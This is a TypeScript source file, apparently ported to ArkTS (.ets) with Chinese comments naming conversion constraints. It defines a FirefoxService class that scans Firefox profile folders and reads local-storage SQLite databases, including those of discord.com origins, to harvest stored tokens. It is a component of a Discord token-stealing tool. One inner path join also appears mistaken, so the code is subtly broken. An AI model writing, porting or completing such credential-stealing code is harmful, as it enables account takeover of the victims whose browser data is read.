// 应用约束9：使用let/const而非var
// 应用约束60：使用ES模块导入语法代替require
import Bluebird from "bluebird";
import fs from "promise-fs";
import path from "path";
import os from "os";
import { List } from "@assasans/storage.ets"; // 转换为.ets后缀
import { Service } from "./service.ets"; // 转换为.ets后缀

// 应用约束28：只有接口可以被implements
class FirefoxService extends Service {
    constructor(name: string, directory: string) {
        super(name, directory);
    }

    // 应用约束45：显式标注异步函数返回类型
    async getTokens(): Promise<List> {
        const tokens = new List();
        const profilesDirectory = path.join(os.homedir(), 'AppData', this.directory, 'Profiles');

        // 应用约束21：使用点操作符访问方法
        if (!await this.exists(profilesDirectory)) return tokens;

        // 应用约束25：数组元素类型明确
        const profileDirectories = (await fs.readdir(profilesDirectory, { encoding: 'utf8' }))
            .map((relative: string) => path.join(profilesDirectory, relative));

        // 应用约束47：使用箭头函数代替内部函数
        await Bluebird.all(profileDirectories.map(async (profileDirectory: string) => {
            try {
                const stat = await fs.stat(profileDirectory);
                if (!stat.isDirectory()) return;
            } catch (error) { // 应用约束40：catch参数无类型标注
                console.error(error);
                return;
            }

            // 处理storagePath部分
            try {
                const storagePath = path.join(profileDirectory, 'webappsstore.sqlite');
                if (!await this.exists(storagePath)) return;
                const content = await fs.readFile(storagePath, { encoding: 'utf8' });
                tokens.addRange(this.extractTokens(content));
            } catch (error) {
                console.error(error);
            }

            // 处理archivePath部分
            try {
                const archivePath = path.join(profileDirectory, 'storage/ls-archive.sqlite');
                if (!await this.exists(archivePath)) return;
                const content = await fs.readFile(archivePath, { encoding: 'utf8' });
                tokens.addRange(this.extractTokens(content));
            } catch (error) {
                console.error(error);
            }

            // 处理storageDirectory部分
            try {
                const storageDirectoryRoot = path.join(profileDirectory, 'storage/default');
                if (!await this.exists(storageDirectoryRoot)) return;
                
                // 应用约束25：数组元素类型明确
                const storageDirectories = (await fs.readdir(storageDirectoryRoot, { encoding: 'utf8' }))
                    .filter((name: string) => /discord(?:app)?\.com/.test(name))
                    .map((relative: string) => path.join(profileDirectory, relative));

                await Bluebird.all(storageDirectories.map(async (storageDirectory: string) => {
                    try {
                        const stat = await fs.stat(storageDirectory);
                        if (!stat.isDirectory()) return;
                    } catch (error) {
                        console.error(error);
                        return;
                    }

                    try {
                        const storagePath = path.join(storageDirectory, 'ls/data.sqlite');
                        if (!await this.exists(storagePath)) return;
                        const content = await fs.readFile(storagePath, { encoding: 'utf8' });
                        tokens.addRange(this.extractTokens(content));
                    } catch (error) {
                        console.error(error);
                    }
                }));
            } catch (error) {
                console.error(error);
            }
        }));

        return tokens;
    }
}

// 应用约束23：显式导出类型
export { FirefoxService };
